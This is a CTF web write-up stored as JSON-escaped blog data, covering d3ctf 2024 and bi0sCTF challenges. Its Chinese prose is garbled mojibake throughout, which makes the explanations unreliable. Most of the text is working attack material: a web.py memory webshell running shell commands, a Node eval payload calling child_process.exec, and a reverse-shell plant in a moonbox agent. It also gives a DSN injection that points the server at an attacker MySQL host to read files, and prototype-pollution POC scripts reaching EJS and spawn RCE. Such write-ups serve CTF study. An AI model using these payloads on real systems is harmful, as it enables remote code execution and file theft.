ä¸ºæœåŠ¡å™¨è°ƒç”¨çš„æ—¶å€™ä¼šä¼ ä¸€ä¸ªselfå‚æ•°)ï¼š\ndef test(asd): return \u0026#34;pwned\u0026#34; index.GET = test è®¿é—®indexè·¯ç”±æ˜¯å¯ä»¥å¸¦getå‚æ•°ï¼š\nif request.query_string: path += \u0026#34;?\u0026#34; + request.query_string.decode() æ‰€ä»¥å†…å­˜é©¬å®ç°å¦‚ä¸‹ï¼š\ndef test(asd): cmd = web.input().cmd return __import__(\u0026#39;os\u0026#39;).popen(cmd).read() index.GET = test stack_overflow è§£å†³ï¼Œä¸€è¡€\né¢˜ç›®ç”¨nodejsæ¨¡æ‹Ÿäº†ä¸€ä¸ªæ ˆæº¢å‡ºã€‚ å…³é”®ä»£ç ï¼š\nlet respond = {} let stack = [] let getStack = function (address) { if (address - pie \u0026gt;= 0 \u0026amp;\u0026amp; address - pie \u0026lt; 0x10000) return stack[address - pie] return 0 } let getIndex = function (address) { return address - pie } let read = function (fd, buf, count) { let ori = req.body[fd] if (ori.length \u0026lt; count) { count = ori.length } if (typeof ori !== \u0026#34;string\u0026#34; \u0026amp;\u0026amp; !Array.isArray(ori)) return res.json({\u0026#34;err\u0026#34;: \u0026#34;hack!\u0026#34;}) for (let i = 0; i \u0026lt; count; i++){ if (waf(ori[i])) return res.json({\u0026#34;err\u0026#34;: \u0026#34;hack!\u0026#34;}) stack[getIndex(buf) + i] = ori[i] } } let write = function (fd, buf, count) { if (!respond.hasOwnProperty(fd)) { respond[fd] = [] } for (let i = 0; i \u0026lt; count; i++){ respond[fd].push(getStack(buf + i)) } } let run = function (address) { let continuing = 1; while (continuing) { switch (getStack(address)) { case \u0026#34;read\u0026#34;: let r_fd = stack.pop() let read_addr = stack.pop() if (read_addr.startsWith(\u0026#34;{{\u0026#34;) \u0026amp;\u0026amp; read_addr.endsWith(\u0026#34;}}\u0026#34;)) { read_addr = pie + eval(read_addr.slice(2,-2).replace(\u0026#34;stack\u0026#34;, (stack.length - 1).toString())) } read(r_fd, parseInt(read_addr), parseInt(stack.pop())) break; case \u0026#34;write\u0026#34;: let w_fd = stack.pop() let write_addr = stack.pop() if (write_addr.startsWith(\u0026#34;{{\u0026#34;) \u0026amp;\u0026amp; write_addr.endsWith(\u0026#34;}}\u0026#34;)) { write_addr = pie + eval(write_addr.slice(2,-2).replace(\u0026#34;stack\u0026#34;, (stack.length - 1).toString())) } write(w_fd, parseInt(write_addr), parseInt(stack.pop())) break; case \u0026#34;exit\u0026#34;: continuing = 0; break; case \u0026#34;call_interface\u0026#34;: let numOfArgs = stack.pop() let cmd = stack.pop() let args = [] for (let i = 0; i \u0026lt; numOfArgs; i++) { args.push(stack.pop()) } cmd += \u0026#34;(\u0026#39;\u0026#34; + args.join(\u0026#34;\u0026#39;,\u0026#39;\u0026#34;) + \u0026#34;\u0026#39;)\u0026#34; let result = vm.runInNewContext(cmd) stack.push(result.toString()) break; case \u0026#34;push\u0026#34;: let numOfElem = stack.pop() let elemAddr = parseInt(stack.pop()) for (let i = 0; i \u0026lt; numOfElem; i++) { stack.push(getStack(elemAddr + i)) } break; default: stack.push(getStack(address)) break; } address += 1 } } let code = `0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 28 [[ 0 ]] stdin read Started Convertion... Your input is: 2 [[short - 3]] stdout write 5 [[ 0 ]] stdout write ... 1 [[short - 2]] stdout write [[ 0 ]] 5 push (function (...a){ return a.map(char=\u0026gt;char.charCodeAt(0)).join(\u0026#39; \u0026#39;);}) 5 call_interface Ascii is: 1 [[short - 2]] result write 1 {{ stack - 2 }} result write Ascii is: 1 [[short - 2]] stdout write 1 {{ stack - 3 }} stdout write ok 1 [[short - 2]] status write exit` code = code.split(\u0026#39;\\n\u0026#39;); for (let i = 0; i \u0026lt; code.length; i++){ stack.push(code[i]) if (stack[i].startsWith(\u0026#34;[[\u0026#34;) \u0026amp;\u0026amp; stack[i].endsWith(\u0026#34;]]\u0026#34;)) { stack[i] = (pie + eval(stack[i].slice(2,-2).replace(\u0026#34;short\u0026#34;, i.toString()))).toString() } } run(pie + 0) return res.json(respond) é¦–å…ˆç¬¬ä¸€æ­¥æ“ä½œreadï¼Œä»stdinè¯»å–ï¼Œåœ°å€ä¸º[[ 0 ]] =\u0026gt; pieï¼Œæœ€å¤§è¯»å–é•¿åº¦ä¸º28ã€‚ä½†æ˜¯codeåˆå§‹åªç»™äº†20ä¸ª0ç©ºä½ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœè¯»å…¥28ä¸ªï¼Œæ­£å¥½ä¼šæŠŠç¬¬äºŒä¸ªæ“ä½œwriteçš„è¯»å–åœ°å€è¦†ç›–ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥æ§åˆ¶writeå‡½æ•°çš„è¯»å–åœ°å€ã€‚ wafè¿‡æ»¤ä¸å…¨ï¼š\nfunction waf(str) { let pattern = /(call_interface)|\\{\\{.*?\\}\\}/g; return str.match(pattern) } ä»”ç»†çœ‹writeå‡½æ•°ï¼Œå¦‚æœåœ°å€ä»¥{{å¼€å¤´ï¼Œ}}ç»“å°¾ï¼Œä¼šå°†ä¸­é—´çš„æ•°æ®ä¼ ç»™evalå‡½æ•°è€Œæ­£åˆ™è¡¨è¾¾å¼.*ä¸èƒ½åŒ¹é…æ¢è¡Œï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨{{\\nrequire('child_process').exec('id')}}æ‰§è¡Œå‘½ä»¤ã€‚readå‡½æ•°å¯ä»¥æ˜¯å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥æ˜¯æ•°ç»„ï¼Œæ‰€ä»¥å¯ä»¥ä¼ æ­¤åœ°å€ã€‚ç¬¬28ä½ä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œ27ä½ä¸ºä¼ å…¥çš„æ•°æ®çš„é•¿åº¦ï¼Œå†™28ã€‚\n{\u0026#34;stdin\u0026#34;:[\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;28\u0026#34;,\u0026#34;{{\\nrequire(\u0026#39;child_process\u0026#39;).exec(\u0026#39;ls / \u0026gt; /app/index.html\u0026#39;)}}\u0026#34;]} é¢˜ç›®ç¯å¢ƒæœ‰ä¸ªå¥‡æ€ªçš„åœ°æ–¹ï¼Œæœ¬åœ°ç¯å¢ƒéœ€è¦/readflagï¼Œç›´æ¥è¯»flagè¯»ä¸å‡ºæ¥ï¼Œä½†è¿œç¨‹ç¯å¢ƒ/readflagè¯»ä¸å‡ºæ¥ï¼Œç›´æ¥è¯»flagå´å¯ä»¥äº†ï¼Œdockerfileé‡Œçš„rootç”¨æˆ·å¯†ç ä¹Ÿæ²¡ç”¨ä¸Šï¼Œæ„Ÿè§‰æ€ªæ€ªçš„ã€‚\nmoonbox è§£å†³\né¢˜ç›®ç»™äº†ä¸ªmoonboxçš„åå°ï¼Œflagåœ¨moonbox-serverå®¹å™¨å†…ã€‚ å®˜æ–¹çš„æµç¨‹å›¾ï¼ˆå½•åˆ¶æ¨¡å¼ï¼‰ moonboxæœ‰è‡ªå®šä¹‰agentçš„åŠŸèƒ½ï¼Œå®˜æ–¹æ–‡æ¡£ï¼š\nå·²ä¿®æ”¹moonbox-agent å¦‚ä¿®æ”¹è¿‡moonbox-agentä»£ç ï¼Œé‚£ä¹ˆéœ€è¦æŠŠä¿®æ”¹è¿‡çš„agentä»£ç é‡æ–°æ‰“åŒ…ã€‚æ‰“åŒ…æ­¥éª¤å¦‚ä¸‹ step1ï¼šmavenæ‰“åŒ…(å¯é€‰) æ‰§è¡Œ mvn clean installæ“ä½œ step2ï¼šæ‰“åŒ…moonbox-agent æ‰§è¡Œæ‰“åŒ…å‘½ä»¤ï¼Œå‘½ä»¤è·¯å¾„ä¸º /moonbox-agent/moonbox-java-agent/bin sh ./install-local-agent.sh step3ï¼šagentåŒ…ä¸Šä¼  moonbox-agent â€œæ–‡ä»¶æ›´æ–°â€ä¸Šä¼ åŒ…ï¼Œå¯ä»¥é€‰æ‹©step2æ‰“åŒ…ç”Ÿæˆçš„ agengtæ–‡ä»¶å³å¯ã€‚\næ ¹æ®æµç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹agentèƒ½å¤Ÿåœ¨JVMæ‰€åœ¨æœºå™¨ä¸­æ‰§è¡Œä»»æ„shellè„šæœ¬ã€‚ ä¸è¿‡å‘¢ï¼Œä½¿ç”¨mvnæ‰“åŒ…çš„è¯å®¹æ˜“æŠ¥é”™ï¼Œç›´æ¥åœ¨.sandbox-module/bin/start-remote-agent.shä¸­å†™å…¥åå¼¹shellçš„å‘½ä»¤ã€‚ç„¶åæ‰“åŒ…ä¸Šä¼ å³å¯ï¼ˆmoonbox-agentï¼‰ã€‚ ç›®å½•ç»“æ„ï¼š\n.sandbox-module/ bin/ install-local-agent.sh start-remote-agent.sh æ­£å¸¸ç‰ˆæœ¬åœ¨local-agentç›®å½•ä¸‹ï¼Œå¯ä»¥å‚è€ƒç€æ”¹ã€‚\næœ‰ä¸ªå‘ï¼Œnginxä¸å…è®¸ä¼ å¤§æ–‡ä»¶ï¼Œå¯ä»¥æŠŠé™¤shellè„šæœ¬ä»¥å¤–çš„æ–‡ä»¶åˆ é™¤ï¼Œä¸å½±å“æ‰§è¡Œã€‚ è¿æ¥JVMæœºå™¨éœ€è¦sshè¿æ¥ï¼Œè€Œå®¹å™¨sshä¸ºå¼±å£ä»¤root:123456ï¼Œé…ç½®å¥½å½•åˆ¶æµé‡å³å¯æ‰§è¡Œshellè„šæœ¬ã€‚\nDoctor æœªè§£å†³\né»˜è®¤å¯†ç å’Œjwt keyéƒ½æ”¹äº†ã€‚\nwebsocketå¯ä»¥ç»•è¿‡éƒ¨åˆ†jwté™åˆ¶ã€‚ å¯¹äºrecoderçš„éªŒè¯ï¼Œå¦‚æœæ˜¯websocketç›´æ¥é€šè¿‡ã€‚\nfunc SuperRecorderGroup() yee.HandlerFunc { return func(c yee.Context) (err error) { if c.IsWebsocket() { return nil } role := new(lib.Token).JwtParse(c) if role.IsRecord { return } return c.ServerError(http.StatusForbidden, \u0026#34;éæ³•è¶Šæƒæ“ä½œï¼\u0026#34;) } } å¯¹äºjwtä¹Ÿæ˜¯\nreturn func(c yee.Context) (err error) { // cause upgrade websocket will clear custom header // when header add jwt bearer that panic if c.IsWebsocket() { return } ä½†æ˜¯æ²¡æœ‰SuperManageGroupæƒé™ã€‚åªèƒ½è·å¾—æ™®é€šç”¨æˆ·æƒé™ã€‚\nç„¶åå°±å¡ä½äº†~~\nèµ›åå¤ç° è¶Šæƒä¹‹åå¯ä»¥è®¿é—®GET /api/v2/fetch/fields\nfunc FetchTableInfo(c yee.Context) (err error) { u := new(_FetchBind) if err = c.Bind(u); err != nil { c.Logger().Error(err.Error()) return c.JSON(http.StatusOK, common.ERR_REQ_BIND) } if u.DataBase != \u0026#34;\u0026#34; \u0026amp;\u0026amp; u.Table != \u0026#34;\u0026#34; { if err := u.FetchTableFieldsOrIndexes(); err != nil { c.Logger().Critical(err.Error()) } return c.JSON(http.StatusOK, common.SuccessPayload(map[string]interface{}{\u0026#34;rows\u0026#34;: u.Rows, \u0026#34;idx\u0026#34;: u.Idx})) } return c.JSON(http.StatusOK, common.ERR_COMMON_MESSAGE(errors.New(i18n.DefaultLang.Load(i18n.INFO_LIBRARY_NAME_TABLE_NAME)))) } è°ƒç”¨FetchTableFieldsOrIndexeså‡½æ•°ï¼š\nfunc (u *_FetchBind) FetchTableFieldsOrIndexes() error { var s model.CoreDataSource model.DB().Where(\u0026#34;source_id =?\u0026#34;, u.SourceId).First(\u0026amp;s) ps := lib.Decrypt(model.JWT, s.Password) db, err := model.NewDBSub(model.DSN{ Username: s.Username, Password: ps, Host: s.IP, Port: s.Port, DBName: u.DataBase, CA: s.CAFile, Cert: s.Cert, Key: s.KeyFile, }) if err != nil { return err } defer model.Close(db) if err := db.Raw(fmt.Sprintf(\u0026#34;SHOW FULL FIELDS FROM `%s`.`%s`\u0026#34;, u.DataBase, u.Table)).Scan(\u0026amp;u.Rows).Error; err != nil { return err } if err := db.Raw(fmt.Sprintf(\u0026#34;SHOW INDEX FROM `%s`.`%s`\u0026#34;, u.DataBase, u.Table)).Scan(\u0026amp;u.Idx).Error; err != nil { return err } return nil } æ­¤æ—¶æ•°æ®åº“ä¸­æ²¡æœ‰DataSourceæ•°æ®ï¼Œæ‰€ä»¥sä¸ºç©ºï¼Œæ‰€ä»¥åé¢çš„DSNä¸­åªæœ‰DBNameå¯æ§ã€‚ model.NewDBSubï¼š\nfunc NewDBSub(dsn DSN) (*gorm.DB, error) { d, err := InitDSN(dsn) if err != nil { return nil, err } db, err := gorm.Open(drive.New(drive.Config{ DSN: d, DefaultStringSize: 256, // string ç±»å‹å­—æ®µçš„é»˜è®¤é•¿åº¦ SkipInitializeWithVersion: false, // æ ¹æ®å½“å‰ MySQL ç‰ˆæœ¬è‡ªåŠ¨é…ç½® }), \u0026amp;gorm.Config{}) if err != nil { return nil, err } return db, nil } InitDSNä¼šå°†dsnåºåˆ—åŒ–ã€‚ InitDSNï¼š\nfunc InitDSN(dsn DSN) (string, error) { isTLS := false if dsn.CA != \u0026#34;\u0026#34; \u0026amp;\u0026amp; dsn.Cert != \u0026#34;\u0026#34; \u0026amp;\u0026amp; dsn.Key != \u0026#34;\u0026#34; { isTLS = true certPool := x509.NewCertPool() if ok := certPool.AppendCertsFromPEM([]byte(dsn.CA)); !ok { return \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;failed to append ca certs\u0026#34;) } clientCert := make([]tls.Certificate, 0, 1) certs, err := tls.X509KeyPair([]byte(dsn.Cert), []byte(dsn.Key)) if err != nil { return \u0026#34;\u0026#34;, err } clientCert = append(clientCert, certs) _ = mmsql.RegisterTLSConfig(\u0026#34;custom\u0026#34;, \u0026amp;tls.Config{ RootCAs: certPool, Certificates: clientCert, InsecureSkipVerify: true, }) } cfg := mmsql.Config{ User: dsn.Username, Passwd: dsn.Password, Addr: fmt.Sprintf(\u0026#34;%s:%d\u0026#34;, dsn.Host, dsn.Port), //IP:PORT Net: \u0026#34;tcp\u0026#34;, DBName: dsn.DBName, Loc: time.Local, AllowNativePasswords: true, ParseTime: true, } if isTLS == true { cfg.TLSConfig = \u0026#34;custom\u0026#34; } return cfg.FormatDSN(), nil } cfgä¸­ä¾ç„¶åªæœ‰DBNameå¯æ§ã€‚ cfg.FormatDSN()ï¼š\nfunc (cfg *Config) FormatDSN() string { var buf bytes.Buffer // [username[:password]@] if len(cfg.User) \u0026gt; 0 { buf.WriteString(cfg.User) if len(cfg.Passwd) \u0026gt; 0 { buf.WriteByte(\u0026#39;:\u0026#39;) buf.WriteString(cfg.Passwd) } buf.WriteByte(\u0026#39;@\u0026#39;) } // [protocol[(address)]] if len(cfg.Net) \u0026gt; 0 { buf.WriteString(cfg.Net) if len(cfg.Addr) \u0026gt; 0 { buf.WriteByte(\u0026#39;(\u0026#39;) buf.WriteString(cfg.Addr) buf.WriteByte(\u0026#39;)\u0026#39;) } } // /dbname buf.WriteByte(\u0026#39;/\u0026#39;) buf.WriteString(cfg.DBName) // [?param1=value1\u0026amp;...\u0026amp;paramN=valueN] hasParam := false if cfg.AllowAllFiles { hasParam = true buf.WriteString(\u0026#34;?allowAllFiles=true\u0026#34;) } ç”ŸæˆDSNï¼šuser:pass@tcp(address:port)/dbname?param=asdï¼Œå…¶ä¸­dbnameå¯æ§ã€‚ è§£æDSNæ—¶ä»åå¾€å‰æ‰¾æ–œæ ï¼š\nfunc ParseDSN(dsn string) (cfg *Config, err error) { // New config with some default values cfg = NewConfig() // [user[:password]@][net[(addr)]]/dbname[?param1=value1\u0026amp;paramN=valueN] // Find the last \u0026#39;/\u0026#39; (since the password or the net addr might contain a \u0026#39;/\u0026#39;) æ‰€ä»¥è®¾ç½®dbnameä¸ºuser:pass@tcp(evil_ip:port)/test?allowAllFiles=true\u0026amp;å¯ä»¥ä½¿æœåŠ¡å™¨è¿æ¥æ¶æ„mysqlæœåŠ¡å™¨ï¼Œå‰é¢çš„åŸå§‹çš„addresså°±è¢«å¿½ç•¥äº†ï¼Œå¼€å¯allowAllFileså¯ä»¥è¯»å–æ–‡ä»¶ã€‚\n","permalink":"https://zoiltin.github.io/posts/d3ctf-2024-web-wp/","summary":"d3pythonhttp è§£å†³ï¼Œä¸€è¡€\njwtç»•è¿‡ def get_key(kid): key = \u0026#34;\u0026#34; dir = \u0026#34;/app/\u0026#34; try: with open(dir+kid, \u0026#34;r\u0026#34;) as f: key = f.read() except: pass print(key) return key def verify_token(token): header = jwt.get_unverified_header(token) kid = header[\u0026#34;kid\u0026#34;] key = get_key(kid) try: payload = jwt.decode(token, key, algorithms=[\u0026#34;HS256\u0026#34;]) return True except: return False éªŒè¯jwtæ—¶kidæ§åˆ¶å¯†é’¥æ–‡ä»¶è·¯å¾„ï¼Œå¦‚æœè®¾ç½®çš„å¯†é’¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™keyä¸ºç©ºï¼Œæ‰€ä»¥æ„é€ ç©ºç§˜é’¥ä»¥åŠä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶å³å¯ï¼š\nprint(jwt.encode({\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;isadmin\u0026#34;:true}, key, algorithm=\u0026#34;HS256\u0026#34;, headers={\u0026#34;kid\u0026#34;: \u0026#34;frontend_keyasdasd\u0026#34;})) # eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M è§£æå·®å¼‚ ä¸€ç§åšæ³•æ˜¯TE-CLè¯·æ±‚èµ°ç§ã€‚ä¸è¿‡æˆ‘ç”¨çš„æ˜¯å¦ä¸€ç§åŠæ³•ï¼šå‰ç«¯ä½¿ç”¨Flaskï¼Œåç«¯ä½¿ç”¨web.pyå­˜åœ¨è§£æå·®å¼‚ã€‚ ç»æµ‹è¯•å‘ç°ï¼šå‰æ®µå¯¹äºchunkedä¸åˆ†å¤§å°å†™ï¼Œåç«¯ä¼šåŒºåˆ†ã€‚å‰ç«¯åªè¿›è¡Œåˆ†å—ä¼ è¾“ï¼Œå¿½ç•¥Content-Lengthã€‚è€Œåç«¯ä¼šå…ˆåˆ†å—ï¼Œå†æ ¹æ®Content-Lengthæˆªå–ï¼Œå‰ç«¯ä¼šæŠŠContent-Lengthç›´æ¥å‘é€ç»™åç«¯ã€‚\nheaders = {key: value for (key, value) in request.headers if key != \u0026#39;Host\u0026#39;} é™¤äº†Hostä»¥å¤–çš„headeréƒ½å‘å¾€åç«¯äº†åŒ…æ‹¬Content-Lengthï¼Œä¸”å‰ç«¯ä¸è¿›è¡Œè®¡ç®—éªŒè¯ã€‚ æ•°æ®åŒ…ï¼š","title":"d3ctf-2024-web-wp"},{"content":"required note ç”¨npm auditæœç´¢å†å²æ¼æ´ã€‚å‘ç°ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“çš„æ¼æ´ã€‚ POC:\nconst protobuf = require(\u0026#34;protobufjs\u0026#34;); protobuf.parse(\u0026#39;option(a).constructor.prototype.verified = true;\u0026#39;); console.log({}.verified); // returns true /createä¼šè¿›è¡Œprotojsè§£æã€‚\napp.post(\u0026#39;/create\u0026#39;, (req, res) =\u0026gt; { requestBody=req.body try{ schema = fs.readFileSync(\u0026#39;./settings.proto\u0026#39;, \u0026#39;utf-8\u0026#39;); root = protobuf.parse(schema).root; Note = root.lookupType(\u0026#39;Note\u0026#39;); [...] åœ¨/customiseå¯ä»¥ä¿®æ”¹settings.protoæ–‡ä»¶ã€‚\napp.post(\u0026#39;/customise\u0026#39;,(req, res) =\u0026gt; { try { const { data } = req.body; let author = data.pop()[\u0026#39;author\u0026#39;]; let title = data.pop()[\u0026#39;title\u0026#39;]; let protoContents = fs.readFileSync(\u0026#39;./settings.proto\u0026#39;, \u0026#39;utf-8\u0026#39;).split(\u0026#39;\\n\u0026#39;); if (author) { protoContents[5] = ` ${author} string author = 3 [default=\u0026#34;user\u0026#34;];`; } if (title) { protoContents[3] = ` ${title} string title = 1 [default=\u0026#34;user\u0026#34;];`; } fs.writeFileSync(\u0026#39;./settings.proto\u0026#39;, protoContents.join(\u0026#39;\\n\u0026#39;), \u0026#39;utf-8\u0026#39;); return res.json({ Message: \u0026#39;Settings changed\u0026#39; }); } catch (error) { console.error(error); res.status(500).json({ Message: \u0026#39;Internal server error\u0026#39; }); } }) è§£é¢˜æ€è·¯ï¼ˆéé¢„æœŸï¼‰æ˜¯é€šè¿‡åŸå‹é“¾æ±¡æŸ“åˆ°ejs renderæ¸²æŸ“rceã€‚ejsåˆ©ç”¨é“¾å‚è€ƒï¼šhttps://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce\nPOCï¼š\nimport requests base_url = \u0026#39;http://192.168.72.137:3000\u0026#39; payloads = [ \u0026#39;option(a).constructor.prototype.client = 1;\u0026#39;.strip(), \u0026#39;option(a).constructor.prototype.escapeFunction = \u0026#34;JSON.stringify; process.mainModule.require(\\\u0026#39;child_process\\\u0026#39;).exec(\\\u0026#39;touch /tmp/poc\\\u0026#39;)\u0026#34;;\u0026#39;.strip() ] for i in payloads: # å†™å…¥settings.proto sp = requests.post(url=base_url+\u0026#39;/customise\u0026#39;,json={ \u0026#34;data\u0026#34; : [ {\u0026#34;title\u0026#34; : \u0026#34;optional\u0026#34;}, {\u0026#34;author\u0026#34; : i + \u0026#34;optional\u0026#34;} ] }) # æ±¡æŸ“ sp = requests.post(url=base_url+\u0026#39;/create\u0026#39;,json={\u0026#34;test\u0026#34; : \u0026#34;test\u0026#34;}) sp = requests.get(url=base_url+\u0026#39;/customise\u0026#39;) # æ‰§è¡Œrenderæ¸²æŸ“è¾¾æˆrce è¿™ä¸ªè§£æ³•æ ¹æœ¬ç”¨ä¸åˆ°bot\nè¸©å‘ åœ¨åŸå‹é“¾æ±¡æŸ“çš„æ—¶å€™ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯ï¼š æœ‰ä¸€ç§æ— æ³•æ±¡æŸ“çš„å‡è±¡ï¼Œå…¶å®é€šè¿‡debugå¯ä»¥å‘ç°ï¼Œè™½ç„¶æŠ¥é”™äº†ä½†æ±¡æŸ“ä¹ŸæˆåŠŸäº†ã€‚\nå¯¹Dockerfileåšä¸‹ä¿®æ”¹ npm installæŒ‚ä»£ç†ï¼Œä¿®æ”¹éƒ¨åˆ†ç›®å½•æƒé™(æ–¹ä¾¿vscode sshé“¾æ¥ï¼Œå°¤å…¶æ˜¯ä¸æ˜¯rootç”¨æˆ·çš„æƒ…å†µä¸‹)ï¼Œæœ€ä¸»è¦çš„æ˜¯æ³¨é‡Šæ‰node index.jsï¼š\nFROM node:20.2.0-alpine RUN apk update \u0026amp;\u0026amp; apk upgrade RUN apk add chromium WORKDIR /app COPY . /app/ RUN mkdir -p /app/notes RUN npm config set proxy=socks5://192.168.136.1:7890 \u0026amp;\u0026amp; PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=1 npm install \u0026amp;\u0026amp; npm config delete proxy RUN chmod +x /app/index.js RUN rm *.json RUN adduser -D -u 1001 bot \u0026amp;\u0026amp; chown -R bot:bot /app/notes \u0026amp;\u0026amp; chown bot:bot /app/settings.proto \u0026amp;\u0026amp; chmod 777 -R /app \u0026amp;\u0026amp; chmod 777 -R /home/bot USER bot ENV PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser #ENTRYPOINT [\u0026#34;node\u0026#34;, \u0026#34;index.js\u0026#34;] docker run -it -p 3000:3000 \u0026lt;image-id\u0026gt; ç„¶åä½¿ç”¨vscodeè¿æ¥å®¹å™¨sshã€‚å‚è€ƒï¼šhttps://www.cnblogs.com/booturbo/p/16323439.html å¯åŠ¨debug åœ¨æ‰§è¡Œrenderæ—¶æ‰“æ–­ç‚¹ï¼Œå‘ç°å·²ç»æ±¡æŸ“æˆåŠŸã€‚ å…¶ä»–çš„RCEåˆ©ç”¨æ–¹å¼ ç¬¬ä¸€ç§ ä½œè€…åŸæ–‡ï¼šhttps://hackmd.io/@r2dev2/Hkj7IhP3T hacktrickä¸Šæœ‰è®¸å¤šæ±¡æŸ“child_processç›¸å…³å˜é‡è¿›è¡Œrceçš„æ–¹æ³•ï¼šhttps://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce\né€šè¿‡spawnå‡½æ•°å’Œcmdlineçš„pocï¼š\n// cmdline trick - working with small variation (shell) // NOT working after kEmptyObject (fix) without options const { spawn } = require(\u0026#39;child_process\u0026#39;); p = {} p.__proto__.shell = \u0026#34;/proc/self/exe\u0026#34; //You need to make sure the node executable is executed p.__proto__.argv0 = \u0026#34;console.log(require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;touch /tmp/spawn-cmdline\u0026#39;).toString())//\u0026#34; p.__proto__.NODE_OPTIONS = \u0026#34;--require /proc/self/cmdline\u0026#34; var proc = spawn(\u0026#39;something\u0026#39;); //var proc = spawn(\u0026#39;something\u0026#39;,[],{\u0026#34;cwd\u0026#34;:\u0026#34;/tmp\u0026#34;}); //To work after kEmptyObject (fix) è€Œä¸”boté€šè¿‡puppeteerå¯åŠ¨chromeæµè§ˆå™¨æ—¶ä¼šè°ƒç”¨spawnå‡½æ•°ã€‚ä»è€Œå®ç°rceã€‚ è¿™ç§æ–¹æ³•åœ¨revengeä¸Šä¸èƒ½ç”¨ã€‚\nç¬¬äºŒç§ ä½œè€…åŸæ–‡ï¼šhttps://gist.github.com/arkark/4a70a2df20da9732979a80a83ea211e2 è¿™é‡Œçš„POC revengeå’Œnon-revengeå‡å¯ã€‚\næ³„éœ²flagidçš„è§£æ³• ä½œè€…åŸæ–‡ï¼šhttps://siunam321.github.io/ctf/bi0sCTF-2024/Web-Exploitation/required-notes/ /searchæœç´¢noteæ—¶ä½¿ç”¨äº†globï¼Œglobåè®®å¯ä»¥ä½¿ç”¨é€šé…ç¬¦ï¼Œæœ‰åˆ©ç”¨çš„å¯èƒ½ã€‚\napp.get(\u0026#39;/search/:noteId\u0026#39;, (req, res) =\u0026gt; { const noteId = req.params.noteId; const notes=glob.sync(`./notes/${noteId}*`); if(notes.length === 0){ return res.json({Message: \u0026#34;Not found\u0026#34;}); } else{ try{ fs.accessSync(`./notes/${noteId}.json`); return res.json({Message: \u0026#34;Note found\u0026#34;}); } catch(err){ return res.status(500).json({ Message: \u0026#39;Internal server error\u0026#39; }); } } }) é€šè¿‡noteIdå¯ä»¥ä¸€ä½ä¸€ä½åœ°è·å–flagidï¼Œä½†æ˜¯app.use('/search', restrictToLocalhost);é™åˆ¶äº†/searchçš„è®¿é—®IPã€‚\nconst restrictToLocalhost = (req, res, next) =\u0026gt; { const remoteAddress = req.connection.remoteAddress; if (remoteAddress === \u0026#39;::1\u0026#39; || remoteAddress === \u0026#39;127.0.0.1\u0026#39; || remoteAddress === \u0026#39;::ffff:127.0.0.1\u0026#39;) { next(); } else { res.status(403).json({ Message: \u0026#39;Access denied\u0026#39; }); } }; æ‰€ä»¥æˆ‘ä»¬åªè¦å°†remoteAddressæ±¡æŸ“ä¸º127.0.0.1å°±å¯ä»¥äº†ã€‚\nè¸©å‘ åœ°å€ä¿®æ”¹ä¸æˆåŠŸ åŸå› æ˜¯è·å–req.connectionä¸­çš„remoteAddressä¸æ˜¯ç›´æ¥è·å–çš„ã€‚ æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹addressã€‚è¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯åœ¨è°ƒç”¨remoteAddressä¹‹å‰_peernameä¸ä¼šå®ä¾‹åŒ–ï¼Œå¯¼è‡´æ±¡æŸ“æ— æ•ˆã€‚ req.connection._getpeername()ä»£ç å¦‚ä¸‹ï¼š\nfunction() { if (!this._handle || !this._handle.getpeername || this.connecting) { return this._peername || {}; } else if (!this._peername) { const out = {}; const err = this._handle.getpeername(out); if (err) return out; this._peername = out; } return this._peername; } æ­£å¸¸æƒ…å†µä¸‹ä¼šè¿›å…¥else ifå› ä¸ºå‘èµ·è¯·æ±‚æ—¶_peernameå°šæœªå®ä¾‹åŒ–ï¼Œç„¶åé€šè¿‡getpeername(out)ç»™_peernameèµ‹å€¼ï¼Œæ±¡æŸ“å°±æ— æ•ˆäº†ã€‚ ä½†å¦‚æœä¸€å¼€å§‹æ±¡æŸ“_peernameï¼Œä½¿_peernameä¸€å¼€å§‹å°±æœ‰å€¼ï¼Œå°±ä¸ä¼šè¿›å…¥else ifï¼Œç›´æ¥returnè¢«æ±¡æŸ“çš„_peernameã€‚ POC:\nimport requests base_url = 